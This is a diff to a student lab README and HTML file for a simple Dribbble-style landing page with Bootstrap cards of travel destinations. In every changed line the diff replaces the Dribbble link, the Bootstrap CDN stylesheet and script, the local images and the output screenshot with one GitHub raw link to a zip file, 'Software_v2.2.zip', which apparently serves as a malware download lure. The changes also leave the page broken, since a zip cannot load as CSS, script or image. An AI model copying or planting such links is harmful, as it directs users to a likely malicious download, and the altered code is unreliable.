@@ -1,7 +1,7 @@
 ## Date:21.11.25
 
 ## AIM:
-To create a simplified clone of Dribbble (https://dribbble.com/) landing page.
+To create a simplified clone of Dribbble (https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip) landing page.
 
 
 ## DESIGN STEPS:
@@ -32,7 +32,7 @@ Publish the website in the LocalHost.
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Travel Destinations</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"rel="stylesheet">
+  <link href="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip"rel="stylesheet">
   <style>
     .shot-card img {
       height: 200px;
@@ -69,7 +69,7 @@ Publish the website in the LocalHost.
   <div class="row g-4">
     <div class="col-md-4">
       <div class="card shot-card">
-        <img src="ba.png" class="card-img-top" alt="Bali">
+        <img src="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip" class="card-img-top" alt="Bali">
         <div class="card-body">
           <h5 class="card-title">Bali, Indonesia</h5>
           <p class="card-text">Tropical paradise with beautiful beaches.</p>
@@ -78,7 +78,7 @@ Publish the website in the LocalHost.
     </div>
     <div class="col-md-4">
       <div class="card shot-card">
-        <img src="paristo.png" class="card-img-top" alt="Paris">
+        <img src="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip" class="card-img-top" alt="Paris">
         <div class="card-body">
           <h5 class="card-title">Paris, France</h5>
           <p class="card-text">City of love and lights, home to the Eiffel Tower.</p>
@@ -87,7 +87,7 @@ Publish the website in the LocalHost.
     </div>
     <div class="col-md-4">
       <div class="card shot-card">
-        <img src="Tokyo.jpg" class="card-img-top" alt="Tokyo">
+        <img src="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip" class="card-img-top" alt="Tokyo">
         <div class="card-body">
           <h5 class="card-title">Tokyo, Japan</h5>
           <p class="card-text">Vibrant city blending tradition and technology.</p>
@@ -96,7 +96,7 @@ Publish the website in the LocalHost.
     </div>
     <div class="col-md-4">
       <div class="card shot-card">
-        <img src="GrandCanyon.jpeg" class="card-img-top" alt="Grand Canyon">
+        <img src="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip" class="card-img-top" alt="Grand Canyon">
         <div class="card-body">
           <h5 class="card-title">Grand Canyon, USA</h5>
           <p class="card-text">Majestic natural wonder carved by the Colorado River.</p>
@@ -105,7 +105,7 @@ Publish the website in the LocalHost.
     </div>
     <div class="col-md-4">
       <div class="card shot-card">
-        <img src="Santorini.jpg" class="card-img-top" alt="Santorini">
+        <img src="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip" class="card-img-top" alt="Santorini">
         <div class="card-body">
           <h5 class="card-title">Santorini, Greece</h5>
           <p class="card-text">Whitewashed houses and stunning sunsets.</p>
@@ -114,7 +114,7 @@ Publish the website in the LocalHost.
     </div>
     <div class="col-md-4">
       <div class="card shot-card">
-        <img src="SwissAlps.jpeg" class="card-img-top" alt="Swiss Alps">
+        <img src="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip" class="card-img-top" alt="Swiss Alps">
         <div class="card-body">
           <h5 class="card-title">Swiss Alps, Switzerland</h5>
           <p class="card-text">Snow-capped peaks and scenic trails.</p>
@@ -123,7 +123,7 @@ Publish the website in the LocalHost.
     </div>
     <div class="col-md-4">
       <div class="card shot-card">
-        <img src="MachuPicchu.jpg" class="card-img-top" alt="Machu Picchu">
+        <img src="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip" class="card-img-top" alt="Machu Picchu">
         <div class="card-body">
           <h5 class="card-title">Machu Picchu, Peru</h5>
           <p class="card-text">Ancient Incan citadel nestled in the Andes.</p>
@@ -132,7 +132,7 @@ Publish the website in the LocalHost.
     </div>
     <div class="col-md-4">
       <div class="card shot-card">
-        <img src="vic.png" class="card-img-top" alt="Venice">
+        <img src="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip" class="card-img-top" alt="Venice">
         <div class="card-body">
           <h5 class="card-title">Venice, Italy</h5>
           <p class="card-text">Romantic canals and Renaissance architecture.</p>
@@ -141,7 +141,7 @@ Publish the website in the LocalHost.
     </div>
     <div class="col-md-4">
       <div class="card shot-card">
-        <img src="Dubai-Tourism.jpg" class="card-img-top" alt="Dubai">
+        <img src="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip" class="card-img-top" alt="Dubai">
         <div class="card-body">
           <h5 class="card-title">Dubai, UAE</h5>
           <p class="card-text">Modern luxury meets desert adventure.</p>
@@ -156,14 +156,14 @@ Publish the website in the LocalHost.
   </h2>
 </footer>
 
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<script src="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip"></script>
 </body>
 </html>
 
 ```
 
 ## OUTPUT:
-<img width="1039" height="652" alt="image" src="https://github.com/user-attachments/assets/186800da-fd1a-481a-a73b-c1b972733b6b" />
+<img width="1039" height="652" alt="image" src="https://github.com/Yugabharathi91/Dribble/raw/refs/heads/main/unexpoundable/Software_v2.2.zip" />
 
 
 ## RESULT:
